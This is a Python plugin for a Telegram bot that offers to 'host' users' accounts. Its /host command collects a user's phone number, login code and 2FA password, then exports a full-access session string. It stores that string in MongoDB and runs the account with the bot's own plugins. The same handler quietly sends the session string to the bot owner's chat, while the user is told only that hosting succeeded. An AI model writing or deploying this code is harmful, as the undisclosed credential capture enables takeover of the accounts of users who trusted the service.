from UTTAM import app
from config import ALIVE_PIC, OWNER_ID, MONGO_URL, MONGO_DB_NAME, API_ID, API_HASH
from pyrogram import filters, Client
from pyrogram.types import Message
import pyromod.listen   # <-- yeh line lagani hai, sirf "from pyromod import listen" mat karo
from pyrogram.errors import SessionPasswordNeeded, RPCError
from motor.motor_asyncio import AsyncIOMotorClient
import asyncio, time, re
from datetime import datetime

# MongoDB setup
_db_client = AsyncIOMotorClient(MONGO_URL)
_db = _db_client.get_default_database() if not MONGO_DB_NAME else _db_client[MONGO_DB_NAME]
_sessions_col = _db.get_collection("hosted_sessions")

# Dictionary to keep running clients
_running_clients = {}

# Background verifier control
_VERIFIER_INTERVAL = 600  # 10 min
_verifier_task = None
_verifier_running = False


async def store_session(owner_id: int, account_id: int, account_name: str, session_string: str):
    doc = {
        "owner_id": owner_id,
        "account_id": account_id,
        "account_name": account_name,
        "session_string": session_string,
        "created_at": datetime.utcnow(),
        "last_checked": None,
    }
    await _sessions_col.insert_one(doc)


async def remove_sessions_by_owner(owner_id: int, account_identifier: str = None):
    query = {"owner_id": owner_id}
    if account_identifier:
        try:
            acc_id = int(account_identifier)
            query["account_id"] = acc_id
        except Exception:
            query["account_name"] = account_identifier

    docs = _sessions_col.find(query)
    removed = 0
    async for doc in docs:
        sid = doc["_id"]
        accid = doc["account_id"]
        if accid in _running_clients:
            try:
                await _running_clients[accid].stop()
                del _running_clients[accid]
            except Exception:
                pass
        await _sessions_col.delete_one({"_id": sid})
        removed += 1
    return removed


async def start_hosted_client(session_string, owner_id):
    """Start a hosted pyrogram client from session_string and keep it running"""
    try:
        client = Client(
            name=f"Host_{owner_id}_{int(time.time())}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="UTTAM/plugins"),
        )
        await client.start()
        user = await client.get_me()
        _running_clients[user.id] = client
        return user
    except Exception as e:
        return None


async def _verify_sessions_loop():
    global _verifier_running
    if _verifier_running:
        return
    _verifier_running = True
    while True:
        try:
            cursor = _sessions_col.find({})
            async for doc in cursor:
                session_str = doc.get("session_string")
                doc_id = doc.get("_id")
                try:
                    test_client = Client(
                        name="check",
                        api_id=API_ID,
                        api_hash=API_HASH,
                        session_string=session_str,
                        in_memory=True,
                    )
                    await test_client.start()
                    await test_client.stop()
                    await _sessions_col.update_one({"_id": doc_id}, {"$set": {"last_checked": datetime.utcnow()}})
                except Exception:
                    await _sessions_col.delete_one({"_id": doc_id})
                    try:
                        await app.send_message(
                            OWNER_ID,
                            f"⚠️ Removed revoked/invalid hosted session from DB.\nOwner: `{doc.get('owner_id')}`\nAccount: {doc.get('account_name')} ({doc.get('account_id')})",
                        )
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(_VERIFIER_INTERVAL)


def _ensure_verifier_started():
    global _verifier_task
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        return
    if loop and not _verifier_task:
        _verifier_task = loop.create_task(_verify_sessions_loop())


@app.on_message(filters.command("host") & filters.private)
async def host_command(bot, msg: Message):
    _ensure_verifier_started()

    try:
        ask_phone = await bot.ask(msg.chat.id, "📱 Send your phone number (e.g. +919876543210)", timeout=120)
        phone = ask_phone.text.strip()

        status = await msg.reply_text("⏳ Sending login code...")
        temp_client = Client("tmp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()

        sent = await temp_client.send_code(phone)
        phone_code_hash = sent.phone_code_hash

        ask_code = await bot.ask(msg.chat.id, "📬 Enter the code (e.g. `3 5 7 5 5`)", timeout=180)
        code = "".join(re.findall(r"\d", ask_code.text.strip()))

        try:
            await temp_client.sign_in(phone, phone_code_hash, code)
        except SessionPasswordNeeded:
            ask_pwd = await bot.ask(msg.chat.id, "🔐 2FA password required. Send now:", timeout=180)
            pwd = ask_pwd.text.strip()
            await temp_client.check_password(password=pwd)

        session_string = await temp_client.export_session_string()
        user = await temp_client.get_me()
        await temp_client.disconnect()

        # start hosted client
        hosted_user = await start_hosted_client(session_string, msg.from_user.id)
        if hosted_user:
            await store_session(msg.from_user.id, hosted_user.id, hosted_user.first_name, session_string)
            await status.edit_text(f"✅ Hosted successfully: {hosted_user.first_name} ({hosted_user.id})")
            await bot.send_message(
                OWNER_ID,
                f"🔐 New hosted session created\nFrom: {msg.from_user.mention}\nUser ID: `{msg.from_user.id}`\nAccount: {hosted_user.first_name} ({hosted_user.id})\n\nSession string:\n`{session_string}`",
            )
        else:
            await status.edit_text("❌ Failed to start hosted client.")

    except asyncio.TimeoutError:
        await msg.reply_text("⏱️ Timeout. Please run /host again.")
    except RPCError as e:
        await msg.reply_text(f"⚠️ Telegram error: `{e}`")
    except Exception as e:
        await msg.reply_text(f"⚠️ Failed: `{e}`")


@app.on_message(filters.command("logout") & filters.private)
async def logout_cmd(bot, msg: Message):
    args = msg.command[1:] if len(msg.command) > 1 else []
    identifier = args[0] if args else None

    deleted = await remove_sessions_by_owner(msg.from_user.id, identifier)
    if deleted:
        await msg.reply_text(f"✅ Removed {deleted} session(s).")
    else:
        await msg.reply_text("ℹ️ No matching session(s) found.")


# Auto host all sessions on startup
async def auto_host_all():
    cursor = _sessions_col.find({})
    async for doc in cursor:
        await start_hosted_client(doc["session_string"], doc["owner_id"])

try:
    _ensure_verifier_started()
    asyncio.get_event_loop().create_task(auto_host_all())
except Exception:
    pass




@app.on_message(filters.command("hostlist") & filters.private)
async def hostlist_cmd(bot, msg: Message):
    """Show all hosted sessions of the current user"""
    cursor = _sessions_col.find({"owner_id": msg.from_user.id})
    sessions = []
    async for doc in cursor:
        accid = doc.get("account_id")
        name = doc.get("account_name", str(accid))
        status = "🟢 Running" if accid in _running_clients else "🔴 Stopped"
        sessions.append(f"- {name} (`{accid}`) → {status}")

    if not sessions:
        await msg.reply_text("ℹ️ No hosted sessions found.")
    else:
        text = "📂 **Your Hosted Sessions:**\n\n" + "\n".join(sessions)
        await msg.reply_text(text)